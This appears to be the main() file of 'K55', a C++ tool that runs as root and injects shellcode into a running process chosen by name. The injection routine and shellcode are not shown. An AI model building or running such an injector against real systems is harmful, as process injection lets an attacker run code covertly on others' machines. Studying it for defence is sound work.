/* Copyright (C) 2021 Josh Schiavone - All Rights Reserved
 * You may use, distribute and modify this code under the
 * terms of the MIT license, which unfortunately won't be
 * written for another century.
 *
 * You should have received a copy of the MIT license with
 * this file. If not, visit : https://opensource.org/licenses/MIT
 */

#include "src/shellcode_inject.h"
#include "src/utility.h"

using namespace SCI;
using namespace UTL;

int main(int argc, const char* argv[]) {
  Kernel kn;
  Injector inj;
  Utility utl;
  User usr;

  long proc_id;

  if (usr.root_privileges()) {
    if (argc < K55_MIN_ARGUMENT_COUNT) {
      std::cerr << "Not enough Arguments.\nUsage: ./K55 <process-name>\n";
      return K55_STANDARD_ERROR_CODE;
    }
    std::cout << "---------------------------------------------------\n";
    if (!kn.retrieve_system_kernel_information()) {
      std::cerr << "Cannot Return Kernel Information\n";
      return K55_STANDARD_ERROR_CODE;
    }
    std::cout << "---------------------------------------------------\n";
    // Error handling already heavily implemented within proc_inject(long)
    if (proc_id = utl.get_process_id_by_name(argv[1])) {
      std::cout << "-> Target Process: " << argv[1] << '\n';
      inj.proc_inject(proc_id);
    }
  } else {
      std::cerr << "You must be running K55 as a root user.\n";
      return K55_STANDARD_ERROR_CODE;
  }

}
